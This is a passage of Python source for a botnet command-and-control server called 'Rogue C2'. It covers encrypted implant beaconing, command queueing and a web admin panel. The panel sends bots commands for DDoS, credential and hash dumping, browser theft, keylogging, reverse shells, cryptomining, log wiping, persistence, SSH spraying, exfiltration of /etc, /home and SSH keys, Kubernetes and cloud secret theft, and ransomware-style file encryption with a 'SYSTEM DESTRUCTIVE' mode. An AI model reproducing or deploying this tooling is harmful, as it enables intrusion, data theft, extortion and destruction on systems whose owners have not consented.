            return None  # ack/answer lost -> caller retries whole frame next cycle
        resp = resp.strip()
        if resp == "ack" or resp == "":
            continue
        last_resp = resp
    if not last_resp:
        return None
    try:
        b = last_resp.replace("-", "+").replace("_", "/")
        b += "=" * ((4 - len(b) % 4) % 4)
        return base64.b64decode(b)
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Framing helper for stream transports (reverse shell etc.)
# ---------------------------------------------------------------------------
def rv2_frame_recv(sock, max_len=1 << 20):
    """Read one length-prefixed frame (4-byte BE header). Returns bytes or None on EOF."""
    hdr = b""
    while len(hdr) < 4:
        chunk = sock.recv(4 - len(hdr))
        if not chunk:
            return None
        hdr += chunk
    ln = struct.unpack(">I", hdr)[0]
    if ln > max_len:
        raise ValueError("frame too large")
    data = b""
    while len(data) < ln:
        chunk = sock.recv(min(65536, ln - len(data)))
        if not chunk:
            return None
        data += chunk
    return data


def rv2_frame_send(sock, payload):
    sock.sendall(struct.pack(">I", len(payload)) + payload)
# ===== END ROGUE-V2 COMMS CORE =====

app = Flask(__name__)
app.secret_key = os.environ.get('ROGUE_FLASK_SECRET') or os.urandom(24).hex()

# === Configuration ===
SECRET_KEY = hashlib.sha256(b'6767BabyROGUE!&%5').digest()  # AES-256 (derived)
EXFIL_DECRYPT_KEY = hashlib.sha256(b'magicRogueSEE!333').digest()  # AES-256 (derived)
C2_PORT = 4444
EXFIL_PORT = 9091
ACTIVE_TUNNEL_URL = None  # populated at startup when an outbound tunnel starts
PAYLOAD_PORT = 8000

# Storage - using defaultdict for better handling
connected_bots = set()
pending_commands = defaultdict(list)
command_results = defaultdict(list)
bot_info = {}
# Map IP to permanent bot ID
ip_to_bot_id = {}

def encrypt_response(msg):
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(msg.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext)

def decrypt_command(data):
    data = base64.b64decode(data)
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode()

def get_bot_id(client_ip, implant_id=None):
    """Get or create consistent bot ID for an implant"""
    # Use implant_id as primary identifier, not IP
    if implant_id:
        # Create bot ID based on implant hash
        bot_id = f"bot_{implant_id}"
        ip_to_bot_id[bot_id] = bot_id  # Store by bot_id, not IP
        return bot_id
    
    # Fallback: use IP with hash if no implant_id
    if client_ip in ip_to_bot_id:
        return ip_to_bot_id[client_ip]
    
    identifier = client_ip
    bot_hash = hashlib.md5(identifier.encode()).hexdigest()[:8]
    bot_id = f"bot_{client_ip.replace('.', '_')}_{bot_hash}"
    ip_to_bot_id[client_ip] = bot_id
    return bot_id

# ==================== FLASK ROUTES ====================

@app.route('/', methods=['GET', 'POST'])
def c2_controller():
    """Main C2 endpoint - handles encrypted communications"""
    if request.method == 'GET':
        return "Rogue C2 Server Active - Use POST for encrypted commands"
    
    # Handle POST from implants
    try:
        client_ip = request.remote_addr
        encrypted_data = request.get_data()
        
        if not encrypted_data:
            return "No data", 400
        
        # V3.3: encrypted v2 frames (json envelope) take priority
        if rv2c_is_v2_frame(encrypted_data):
            resp = rv2c_handle_frame(encrypted_data, client_ip)
            if resp is None:
                return "rejected", 400
            return resp
        
        # Legacy v1 framing - accepted for older implants
        # Decrypt the command
        decrypted_cmd = decrypt_command(encrypted_data)
        
        # Handle beacon/command
        if decrypted_cmd == "beacon":
            # For beacon without implant_id, use IP-based ID (fallback)
            beacon_id = get_bot_id(client_ip)
            
            # Add to connected bots
            connected_bots.add(beacon_id)
            
            # Update bot info
            if beacon_id not in bot_info:
                bot_info[beacon_id] = {
                    'ip': client_ip,
                    'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'beacon_count': 0,
                    'commands_sent': 0,
                    'results_received': 0,
                    'implant_id': 'unknown',  # Will be updated when identified
                    'cloud_info': {}  # Add cloud info field
                }
            
            # Update stats
            bot_info[beacon_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            bot_info[beacon_id]['beacon_count'] += 1
            
            # Return pending commands or "pong"
            commands = pending_commands.get(beacon_id, [])
            
            if commands:
                command_to_execute = commands.pop(0)
                response = command_to_execute
                print(f"[>] Sending command to {beacon_id}: {command_to_execute}")
                bot_info[beacon_id]['commands_sent'] += 1
            else:
                response = "pong"
                print(f"[+] Beacon #{bot_info[beacon_id]['beacon_count']} from {beacon_id}")
            
            return encrypt_response(response)
        
        elif decrypted_cmd.startswith("result:"):
            # Store result from implant
            result = decrypted_cmd.replace("result:", "", 1)
            
            # Extract bot_id from result if possible, otherwise use IP
            beacon_id = None
            
            # Try to find which bot this result belongs to
            for bot_id in connected_bots:
                if bot_id in result or client_ip in bot_info.get(bot_id, {}).get('ip', ''):
                    beacon_id = bot_id
                    break
            
            if not beacon_id:
                # Create new bot entry if not found
                beacon_id = get_bot_id(client_ip)
                if beacon_id not in bot_info:
                    bot_info[beacon_id] = {
                        'ip': client_ip,
                        'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'beacon_count': 1,
                        'commands_sent': 0,
                        'results_received': 0,
                        'implant_id': 'unknown',
                        'cloud_info': {}
                    }
            
            result_entry = {
                'result': result,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'client_ip': client_ip,
                'bot_id': beacon_id
            }
            
            command_results[beacon_id].append(result_entry)
            bot_info[beacon_id]['results_received'] += 1
            bot_info[beacon_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            # Keep only last 10 results
            if len(command_results[beacon_id]) > 10:
                command_results[beacon_id] = command_results[beacon_id][-10:]
            
            print(f"[+] Result from {beacon_id}: {result[:100]}...")
            
            return encrypt_response("result_received")
        
        elif decrypted_cmd.startswith("identify:"):
            # Implant sending identification - THIS IS KEY
            implant_id = decrypted_cmd.replace("identify:", "", 1).strip()
            
            # Use the implant's actual ID, not IP
            beacon_id = get_bot_id(client_ip, implant_id)
            
            # Update connected bots
            connected_bots.add(beacon_id)
            
            # Update bot info with implant_id
            if beacon_id not in bot_info:
                bot_info[beacon_id] = {
                    'ip': client_ip,
                    'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'beacon_count': 0,
                    'commands_sent': 0,
                    'results_received': 0,
                    'implant_id': implant_id,
                    'cloud_info': {}
                }
            else:
                bot_info[beacon_id]['implant_id'] = implant_id
            
            bot_info[beacon_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            print(f"[+] Implant identified: {implant_id} -> Bot ID: {beacon_id}")
            
            return encrypt_response(f"identified:{beacon_id}")
        
        elif decrypted_cmd.startswith("cloud_detected:"):
            # Implant reporting cloud environment
            cloud_data = json.loads(decrypted_cmd.replace("cloud_detected:", "", 1))
            
            # Get or create bot ID
            beacon_id = get_bot_id(client_ip, cloud_data.get('implant_id', 'unknown'))
            
            # Store cloud info
            if beacon_id not in bot_info:
                bot_info[beacon_id] = {
                    'ip': client_ip,
                    'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'beacon_count': 0,
                    'commands_sent': 0,
                    'results_received': 0,
                    'implant_id': 'unknown'
                }
            
            bot_info[beacon_id]['cloud_info'] = cloud_data
            bot_info[beacon_id]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            print(f"[CLOUD] Bot {beacon_id} detected in {cloud_data.get('provider', 'unknown')} cloud")
            
            return encrypt_response("cloud_info_received")
        
        else:
            # Unknown command
            return encrypt_response(f"Unknown command: {decrypted_cmd}")
            
    except Exception as e:
        print(f"[!] C2 controller error: {e}")
        return encrypt_response(f"[!] Error: {str(e)}")

@app.route('/admin', methods=['GET'])
def admin_panel():
    """Web-based admin panel"""
    admin_html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>R0gue C2 Admin Panel</title>
        <style>
            body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; margin: 0; padding: 20px; }
            .container { max-width: 1400px; margin: 0 auto; }
            .header { background: #111; padding: 20px; border-bottom: 2px solid #00ff00; }
            .section { background: #151515; padding: 20px; margin: 20px 0; border: 1px solid #333; }
            .bot { background: #1a1a1a; padding: 15px; margin: 10px 0; border-left: 4px solid #ff0000; }
            .command-form { margin: 15px 0; }
            input, textarea, select, button { 
                background: #222; color: #0f0; border: 1px solid #444; 
                padding: 8px; margin: 5px; font-family: 'Courier New', monospace;
            }
            button { cursor: pointer; background: #333; }
            button:hover { background: #444; }
            .results { background: #111; padding: 10px; margin: 10px 0; font-size: 12px; }
            .status { color: #00ff00; }
            .error { color: #ff0000; }
            .active-bot { border-left: 4px solid #00ff00 !important; }
            .bot-stats { font-size: 12px; color: #888; margin-top: 5px; }
            .button-group { display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0; }
            .button-group button { flex: 1; min-width: 120px; }
            .payload-btn { background: #2a2a5a; }
            .recon-btn { background: #5a2a2a; }
            .attack-btn { background: #5a2a5a; }
            .stealth-btn { background: #2a5a2a; }
            .util-btn { background: #2a5a5a; }
            .compound-btn { background: #5a5a2a; }
            .encryption-btn { background: #ff6600; }
            .advanced-btn { background: #8a2be2; }
            .cloud-btn { background: #2b8a8a; }
            .k8s-btn { background: #326ce5; }
            .tab-container { display: flex; border-bottom: 1px solid #444; margin-bottom: 20px; }
            .tab { padding: 10px 20px; cursor: pointer; border: 1px solid transparent; }
            .tab.active { background: #222; border: 1px solid #444; border-bottom: none; }
            .tab-content { display: none; }
            .tab-content.active { display: block; }
            .command-history { max-height: 300px; overflow-y: auto; }
            .fileransom-form { display: flex; flex-wrap: wrap; gap: 10px; align-items: flex-end; margin: 15px 0; }
            .fileransom-form > div { display: flex; flex-direction: column; }
            .fileransom-form label { font-size: 12px; margin-bottom: 3px; color: #888; }
            .warning-box { background: #3a1a1a; border: 2px solid #ff3333; padding: 15px; margin: 15px 0; }
            .advanced-box { background: #1a1a3a; border: 2px solid #8a2be2; padding: 15px; margin: 15px 0; }
            .cloud-box { background: #1a2a3a; border: 2px solid #2b8a8a; padding: 15px; margin: 15px 0; }
            .k8s-box { background: #1a1a3a; border: 2px solid #326ce5; padding: 15px; margin: 15px 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1> R0gue C2  | by ek0ms savi0r </h1>
                <p>Server Time: {{ time }} | Active Bots: {{ bot_count }} | Commands Pending: {{ pending_count }}</p>
            </div>
            
            <div class="tab-container">
                <div class="tab active" onclick="switchTab('bots')"> Active Bots ({{ bot_count }})</div>
                <div class="tab" onclick="switchTab('operations')"> Operations</div>
                <div class="tab" onclick="switchTab('payloads')"> Payloads</div>
                <div class="tab" onclick="switchTab('advanced')"> Advanced</div>
                <div class="tab" onclick="switchTab('cloud')"> Cloud Ops</div>
                <div class="tab" onclick="switchTab('k8s')"> Kubernetes</div>
                <div class="tab" onclick="switchTab('results')"> Results</div>
                <div class="tab" onclick="switchTab('server')"> Server Status</div>
            </div>
            
            <!-- BOTS TAB -->
            <div id="bots-tab" class="tab-content active">
                <div class="section">
                    <h2> Active Bots ({{ bot_count }})</h2>
                    {% for bot in bot_list %}
                    <div class="bot {{ 'active-bot' if bot.last_seen_diff < 60 else '' }}">
                        <strong> {{ bot.id }}</strong>
                        <span class="status">● Implant ID: {{ bot.implant_id }}</span>
                        <span class="status">● Last seen: {{ bot.last_seen }} ({{ bot.last_seen_diff }}s ago)</span>
                        <span class="status">● IP: {{ bot.ip }}</span>
                        
                        <!-- CLOUD INFO DISPLAY -->
                        {% if bot.get('cloud_info') and bot.cloud_info %}
                        <span class="status" style="color: #2b8a8a;">
                            ● Cloud: {{ bot.cloud_info.provider|upper if bot.cloud_info.provider != 'unknown' else 'Unknown' }}
                            {% if bot.cloud_info.type %} ({{ bot.cloud_info.type }}){% endif %}
                        </span>
                        {% endif %}
                        
                        <div class="bot-stats">
                             Beacons: {{ bot.beacon_count }} |  Cmds Sent: {{ bot.commands_sent }} |  Results: {{ bot.results_received }}
                        </div>
                        
                        <div class="command-form">
                            <input type="text" id="cmd_{{ bot.id }}" placeholder="Command (whoami, ls, etc.)" style="width: 300px;">
                            <select id="type_{{ bot.id }}">
                                <option value="shell">Shell Command</option>
                                <option value="trigger_ddos">DDoS Attack</option>
                                <option value="trigger_exfil">Exfiltrate Data</option>
                                <option value="trigger_dumpcreds">Dump Credentials</option>
                                <option value="trigger_mine">Start Miner</option>
                                <option value="trigger_stealthinject">PolyRoot Persistence</option>
                                <option value="reverse_shell">Reverse Shell</option>
                                <option value="trigger_sysrecon">System Recon</option>
                                <option value="trigger_linpeas">PrivEsc Check</option>
                                <option value="trigger_hashdump">Dump Hashes</option>
                                <option value="trigger_browsersteal">Browser Data</option>
                                <option value="trigger_keylogger">Keylogger</option>
                                <option value="trigger_screenshot">Screenshots</option>
                                <option value="trigger_logclean">Clean Logs</option>
                                <!-- NEW ADVANCED PAYLOADS -->
                                <option value="trigger_procinject">Process Injection</option>
                                <option value="trigger_filehide">Advanced File Hide</option>
                                <option value="trigger_cronpersist">Advanced Cron Persist</option>
                                <option value="trigger_compclean">Competitor Cleaner</option>
                                <!-- CLOUD TRIGGERS -->
                                <option value="trigger_cloud_detect">Detect Cloud</option>
                                <option value="trigger_cloud_recon">Cloud Recon</option>
                                <option value="trigger_aws_creds">AWS Creds</option>
                                <option value="trigger_aws_enum">AWS Enum</option>
                                <option value="trigger_azure_creds">Azure Creds</option>
                                <option value="trigger_azure_enum">Azure Enum</option>
                                <option value="trigger_gcp_creds">GCP Creds</option>
                                <option value="trigger_gcp_enum">GCP Enum</option>
                                <option value="trigger_container_escape">Container Escape</option>
                                <!-- KUBERNETES TRIGGERS -->
                                <option value="trigger_k8s_creds">K8s Credentials</option>
                                <option value="trigger_k8s_steal">K8s Secret Steal</option>
                                <option value="trigger_k8s_target">K8s Targeted Steal</option>
                                <!-- FILE ENCRYPTION OPTIONS -->
                                <option value="trigger_fileransom encrypt /home/user/Documents">Encrypt Documents</option>
                                <option value="trigger_fileransom encrypt /home/user/Downloads">Encrypt Downloads</option>
                                <option value="trigger_fileransom encrypt /home/user/Desktop">Encrypt Desktop</option>
                                <option value="trigger_fileransom encrypt /home/user/Pictures">Encrypt Pictures</option>
                                <option value="trigger_fileransom encrypt /tmp">Encrypt /tmp (Test)</option>
                                <option value="trigger_fileransom encrypt all">Encrypt All User Files</option>
                                <option value="trigger_fileransom encrypt system_test">System Test (/tmp only)</option>
                                <option value="trigger_fileransom encrypt system_user">System User Mode</option>
                                <option value="trigger_fileransom encrypt system_aggressive">System Aggressive</option>
                                <option value="trigger_fileransom encrypt system_destructive">SYSTEM DESTRUCTIVE</option>
                                <option value="trigger_fileransom decrypt /home/user/Documents">Decrypt Documents</option>
                                <option value="trigger_fileransom decrypt system_wide">System Wide Decrypt</option>
                                <!-- END FILE ENCRYPTION -->
                                <option value="trigger_status">Implant Status</option>
                                <option value="trigger_help">Show Help</option>
                            </select>
                            <button onclick="sendCommand('{{ bot.id }}')">Send Command</button>
                            <button onclick="clearPending('{{ bot.id }}')" style="background: #660000;">Clear Pending</button>
                            <button onclick="sendToBot('{{ bot.id }}', 'trigger_status')" style="background: #2a5a5a;">Status</button>
                        </div>
                        
                        {% if pending_commands.get(bot.id) %}
                        <div class="results" style="border-left: 3px solid orange;">
                            <h4> Pending Commands:</h4>
                            {% for cmd in pending_commands[bot.id] %}
                            <div><small></small> {{ cmd }}</div>
                            {% endfor %}
                        </div>
                        {% endif %}
                        
                        {% if results.get(bot.id) %}
                        <div class="results command-history">
                            <h4> Recent Results:</h4>
                            {% for result in results[bot.id][-5:] %}
                            <div><small>{{ result.timestamp }}:</small> {{ result.result[:200] }}...</div>
                            {% endfor %}
                        </div>
                        {% endif %}
                    </div>
                    {% endfor %}
                    
                    <!-- KUBERNETES SPECIAL SECTION -->
                    <div class="section k8s-box">
                        <h3 style="color: #326ce5;"> Kubernetes Secret Stealer</h3>
                        <p><small>Steal Kubernetes secrets, configs, tokens, and certificates from compromised containers</small></p>
                        
                        <div class="button-group">
                            <button class="k8s-btn" onclick="sendToBot(selectedBotId(), 'trigger_k8s_steal')">Steal All Secrets</button>
                            <button class="k8s-btn" onclick="showK8sTargetForm()">Targeted Steal</button>
                            <button class="k8s-btn" onclick="sendToBot(selectedBotId(), 'load_payload k8s_secret_stealer.py')">Load Payload</button>
                            <button class="k8s-btn" onclick="sendToBot(selectedBotId(), 'run_payload k8s_secret_stealer.py')">Run Payload</button>
                        </div>
                        
                        <div id="k8s-target-form" style="display: none; margin-top: 15px; padding: 15px; background: #0a0a0a; border: 1px solid #326ce5;">
                            <h4>Targeted Kubernetes Secret Stealing</h4>
                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                                <div>
                                    <label>Namespace:</label>
                                    <input type="text" id="k8s_namespace" placeholder="default" style="width: 100%;">
                                </div>
                                <div>
                                    <label>Secret Name (optional):</label>
                                    <input type="text" id="k8s_secret" placeholder="Leave empty for all secrets" style="width: 100%;">
                                </div>
                            </div>
                            <div style="margin-top: 10px;">
                                <button onclick="executeK8sTargeted()" style="background: #326ce5;">Execute Targeted Steal</button>
                                <button onclick="hideK8sTargetForm()" style="background: #666;">Cancel</button>
                            </div>
                        </div>
                        
                        <div style="margin-top: 10px; font-size: 12px; color: #aaa;">
                            <strong>Features:</strong><br>
                            • <strong>Complete Secret Dump</strong>: Extract all secrets from all namespaces<br>
                            • <strong>Targeted Extraction</strong>: Steal specific secrets from specific namespaces<br>
                            • <strong>Token Harvesting</strong>: Collect service account tokens<br>
                            • <strong>Certificate Extraction</strong>: Steal TLS certificates<br>
                            • <strong>ConfigMap Collection</strong>: Gather configuration data<br>
                            • <strong>SSH Key Harvesting</strong>: Extract SSH keys from pods
                        </div>
                    </div>
                    
                    <!-- ADVANCED PAYLOADS SECTION -->
                    <div class="section advanced-box">
                        <h3 style="color: #8a2be2;"> Advanced Payloads (NEW)</h3>
                        <p><small>Advanced stealth and persistence techniques for elite operations</small></p>
                        
                        <div class="button-group">
                            <button class="advanced-btn" onclick="sendToBot(selectedBotId(), 'trigger_procinject')">Process Injection</button>
                            <button class="advanced-btn" onclick="sendToBot(selectedBotId(), 'trigger_filehide')">Advanced File Hide</button>
                            <button class="advanced-btn" onclick="sendToBot(selectedBotId(), 'trigger_cronpersist')">Advanced Cron Persist</button>
                            <button class="advanced-btn" onclick="sendToBot(selectedBotId(), 'trigger_compclean')">Competitor Cleaner</button>
                        </div>
                        
                        <div style="margin-top: 10px; font-size: 12px; color: #aaa;">
                            <strong>Description:</strong><br>
                            • <strong>Process Injection</strong>: Inject implant into legitimate processes for stealth<br>
                            • <strong>Advanced File Hide</strong>: Hide files using advanced techniques (extended attributes, etc.)<br>
                            • <strong>Advanced Cron Persist</strong>: Set up sophisticated cron-based persistence<br>
                            • <strong>Competitor Cleaner</strong>: Remove other malware/botnets from the system
                        </div>
                    </div>
                    
                    <!-- FILE ENCRYPTION TOOL -->
                    <div class="section warning-box">
                        <h3 style="color: #ff6600;"> File Encryption Tool (DESTRUCTIVE)</h3>
                        <p><small>WARNING: This tool encrypts files and removes originals. Only use in authorized test environments!</small></p>
                        
                        <div class="fileransom-form">
                            <div>
                                <label>Action:</label>
                                <select id="fileransom_action">
                                    <option value="encrypt">Encrypt Files</option>
                                    <option value="decrypt">Decrypt Files</option>
                                </select>
                            </div>
                            <div>
                                <label>Target Path:</label>
                                <input type="text" id="fileransom_path" placeholder="/home/user/Documents or 'all' or 'system_<mode>'" style="width: 300px;">
                            </div>
                            <div>
                                <label>Mode (for encryption):</label>
                                <select id="fileransom_mode">
                                    <option value="standard">Standard (specified path)</option>
                                    <option value="all">All User Files</option>
                                    <option value="system_test">System Test (/tmp only)</option>
                                    <option value="system_user">System User (user dirs only)</option>
                                    <option value="system_aggressive">System Aggressive (+logs)</option>
                                    <option value="system_destructive">SYSTEM DESTRUCTIVE</option>
                                </select>
                            </div>
                            <div>
                                <label>Password (optional for encrypt):</label>
                                <input type="text" id="fileransom_password" placeholder="Leave empty for auto-generate">
                            </div>
                            <div style="align-self: flex-end;">
                                <button onclick="sendFileransomCommand()" style="background: #ff6600; font-weight: bold;">Execute File Encryption</button>
                            </div>
                        </div>
                        <div style="margin-top: 10px;">
                            <button onclick="quickFileransom('encrypt', 'all', null)" style="background: #ff5500;">Quick: Encrypt All User Files</button>
                            <button onclick="quickFileransom('encrypt', 'system_test', null)" style="background: #ff9900;">System Test (/tmp only)</button>
                            <button onclick="quickFileransom('encrypt', 'system_user', null)" style="background: #ff3300;">System User Mode</button>
                            <button onclick="quickFileransom('decrypt', 'system_wide', null)" style="background: #3366ff;">System Wide Decrypt</button>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- OPERATIONS TAB -->
            <div id="operations-tab" class="tab-content">
                <div class="section">
                    <h2> Quick Commands</h2>
                    <div class="button-group">
                        <button onclick="sendToAll('whoami')">Whoami (All)</button>
                        <button onclick="sendToAll('uname -a')">System Info</button>
                        <button onclick="sendToAll('ip a')">Network Info</button>
                        <button onclick="sendToAll('ls -la /home')">List Homes</button>
                        <button onclick="sendToAll('ps aux')">Process List</button>
                        <button onclick="sendToAll('df -h')">Disk Usage</button>
                    </div>
                </div>
                
                <div class="section">
                    <h2> Reconnaissance & Intelligence</h2>
                    <div class="button-group">
                        <button class="recon-btn" onclick="sendToAll('trigger_sysrecon')">System Recon</button>
                        <button class="recon-btn" onclick="sendToAll('trigger_linpeas')">PrivEsc Check</button>
                        <button class="recon-btn" onclick="sendToAll('trigger_hashdump')">Dump Hashes</button>
                        <button class="recon-btn" onclick="sendToAll('trigger_browsersteal')">Browser Data</button>
                        <button class="recon-btn" onclick="sendToAll('trigger_dumpcreds')">Dump Creds</button>
                        <button class="recon-btn" onclick="sendToAll('trigger_network_scan')">Network Scan</button>
                    </div>
                </div>
                
                <div class="section">
                    <h2> Kubernetes Operations</h2>
                    <div class="button-group">
                        <button class="k8s-btn" onclick="sendToAll('trigger_k8s_steal')">Steal All K8s Secrets</button>
                        <button class="k8s-btn" onclick="sendToAll('load_payload k8s_secret_stealer.py')">Load K8s Stealer</button>
                        <button class="k8s-btn" onclick="sendToAll('run_payload k8s_secret_stealer.py')">Run K8s Stealer</button>
                    </div>
                </div>
                
                <div class="section">
                    <h2> Advanced Operations</h2>
                    <div class="button-group">
                        <button class="compound-btn" onclick="sendToAll('trigger_full_recon')">Full Recon Suite</button>
                        <button class="compound-btn" onclick="sendToAll('trigger_harvest_all')">Harvest All Data</button>
                        <button class="compound-btn" onclick="sendToAll('trigger_clean_sweep')">Clean Sweep</button>
                    </div>
                </div>
                
                <!-- NEW ADVANCED PAYLOADS SECTION -->
                <div class="section advanced-box">
                    <h2 style="color: #8a2be2;"> Advanced Payloads (NEW)</h2>
                    <div class="button-group">
                        <button class="advanced-btn" onclick="sendToAll('trigger_procinject')">Process Injection</button>
                        <button class="advanced-btn" onclick="sendToAll('trigger_filehide')">Advanced File Hide</button>
                        <button class="advanced-btn" onclick="sendToAll('trigger_cronpersist')">Advanced Cron Persist</button>
                        <button class="advanced-btn" onclick="sendToAll('trigger_compclean')">Competitor Cleaner</button>
                    </div>
                </div>
                
                <div class="section">
                    <h2> File Operations</h2>
                    <div class="button-group">
                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt /home/user/Documents')">Encrypt Documents</button>
                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt /home/user/Downloads')">Encrypt Downloads</button>
                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt /home/user/Desktop')">Encrypt Desktop</button>
                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt /tmp')" style="background: #ff3300;">Test Encrypt /tmp</button>
                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt all')" style="background: #ff5500;">Encrypt All User Files</button>
                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt system_test')" style="background: #ff9900;">System Test (/tmp only)</button>
                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt system_user')" style="background: #ff3300;">System User Mode</button>
                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt system_aggressive')" style="background: #ff2200;">System Aggressive</button>
                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom encrypt system_destructive')" style="background: #ff0000; color: white;">SYSTEM DESTRUCTIVE</button>
                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom decrypt /home/user/Documents')" style="background: #3366ff;">Decrypt Documents</button>
                        <button class="encryption-btn" onclick="sendToAll('trigger_fileransom decrypt system_wide')" style="background: #0066ff;">System Wide Decrypt</button>
                    </div>
                </div>
                
                <div class="section">
                    <h2> Persistence & Stealth</h2>
                    <div class="button-group">
                        <button class="stealth-btn" onclick="sendToAll('trigger_stealthinject')">PolyRoot Persistence</button>
                        <button class="stealth-btn" onclick="sendToAll('trigger_persistence_setup')">Additional Persistence</button>
                        <button class="stealth-btn" onclick="sendToAll('trigger_defense_evasion')">Defense Evasion</button>
                        <button class="stealth-btn" onclick="sendToAll('trigger_logclean')">Clean Logs</button>
                        <button class="stealth-btn" onclick="sendToAll('trigger_logclean all')">Clean All Logs</button>
                    </div>
                </div>
                
                <div class="section">
                    <h2> Monitoring & Collection</h2>
                    <div class="button-group">
                        <button class="payload-btn" onclick="sendToAll('trigger_keylogger')">Start Keylogger</button>
                        <button class="payload-btn" onclick="sendToAll('trigger_keylogger stop')">Stop Keylogger</button>
                        <button class="payload-btn" onclick="sendToAll('trigger_screenshot')">Start Screenshots</button>
                        <button class="payload-btn" onclick="sendToAll('trigger_screenshot stop')">Stop Screenshots</button>
                        <button class="payload-btn" onclick="sendToAll('reverse_shell')">Reverse Shell</button>
                    </div>
                </div>
                
                <div class="section">
                    <h2> Lateral Movement & Propagation</h2>
                    <div class="button-group">
                        <button class="attack-btn" onclick="sendToAll('trigger_lateral_move')">Lateral Movement</button>
                        <button class="attack-btn" onclick="sendToAll('trigger_autodeploy')">Auto-Deploy</button>
                        <button class="attack-btn" onclick="sendToAll('trigger_sshspray')">SSH Spray</button>
                        <button class="attack-btn" onclick="sendToAll('trigger_dnstunnel')">DNS Tunnel</button>
                        <button class="attack-btn" onclick="sendToAll('trigger_dnstunnel stop')">Stop DNS Tunnel</button>
                    </div>
                </div>
                
                <div class="section">
                    <h2> DDoS & Cryptomining</h2>
                    <div class="button-group">
                        <button class="attack-btn" onclick="sendToAll('trigger_ddos 192.168.1.1 80 60')">DDoS Test (60s)</button>
                        <button class="attack-btn" onclick="sendToAll('trigger_mine')">Start Miner</button>
                        <button class="attack-btn" onclick="sendToAll('trigger_stopmine')">Stop Miner</button>
                    </div>
                </div>
                
                <div class="section">
                    <h2> Implant Management</h2>
                    <div class="button-group">
                        <button class="util-btn" onclick="sendToAll('trigger_status')">Check Status</button>
                        <button class="util-btn" onclick="sendToAll('trigger_self_update')">Self Update</button>
                        <button class="util-btn" onclick="sendToAll('trigger_help')">Show Help</button>
                        <button class="util-btn" onclick="sendToAll('trigger_forensics_check')">Forensics Check</button>
                    </div>
                </div>
                
                <div class="section">
                    <h2> Data Exfiltration</h2>
                    <div class="button-group">
                        <button class="payload-btn" onclick="sendToAll('trigger_exfil /etc')">Exfil /etc</button>
                        <button class="payload-btn" onclick="sendToAll('trigger_exfil /home')">Exfil /home</button>
                        <button class="payload-btn" onclick="sendToAll('trigger_exfil /var/log')">Exfil Logs</button>
                        <button class="payload-btn" onclick="sendToAll('trigger_exfil ~/.ssh')">Exfil SSH Keys</button>
                    </div>
                </div>
            </div>
            
            <!-- PAYLOADS TAB -->
            <div id="payloads-tab" class="tab-content">
                <div class="section">
                    <h2> Payload Management</h2>
                    <div class="button-group">
                        <button onclick="location.href='/payloads/'">Browse Payloads</button>
                        <button onclick="refreshPayloads()">Refresh Payloads</button>
                    </div>
                    
                    <h3> Available Payloads</h3>
                    <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 10px;">
                        <div class="bot">
                            <strong>System Reconnaissance</strong>
                            <p><small>Comprehensive system/network intelligence gathering</small></p>
                            <button onclick="sendToAll('load_payload sysrecon.py')">Load</button>
                            <button onclick="sendToAll('run_payload sysrecon.py')">Run</button>
                        </div>
                        <div class="bot">
                            <strong>LinPEAS Light</strong>
                            <p><small>Linux privilege escalation checker</small></p>
                            <button onclick="sendToAll('load_payload linpeas_light.py')">Load</button>
                            <button onclick="sendToAll('run_payload linpeas_light.py')">Run</button>
                        </div>
                        <div class="bot">
                            <strong>Hash Dumper</strong>
                            <p><small>Extract password hashes from system</small></p>
                            <button onclick="sendToAll('load_payload hashdump.py')">Load</button>
                            <button onclick="sendToAll('run_payload hashdump.py')">Run</button>
                        </div>
                        <div class="bot">
                            <strong>Browser Stealer</strong>
                            <p><small>Extract browser credentials and data</small></p>
                            <button onclick="sendToAll('load_payload browserstealer.py')">Load</button>
                            <button onclick="sendToAll('run_payload browserstealer.py')">Run</button>
                        </div>
                        <div class="bot">
                            <strong>Keylogger</strong>
                            <p><small>Keystroke logging module</small></p>
                            <button onclick="sendToAll('load_payload keylogger.py')">Load</button>
                            <button onclick="sendToAll('run_payload keylogger.py')">Run</button>
                        </div>
                        <div class="bot">
                            <strong>Screenshot Capture</strong>
                            <p><small>Periodic screen capture</small></p>
                            <button onclick="sendToAll('load_payload screenshot.py')">Load</button>
                            <button onclick="sendToAll('run_payload screenshot.py')">Run</button>
                        </div>
                        <div class="bot">
                            <strong>Log Cleaner</strong>
                            <p><small>Remove forensic traces from logs</small></p>
                            <button onclick="sendToAll('load_payload logcleaner.py')">Load</button>
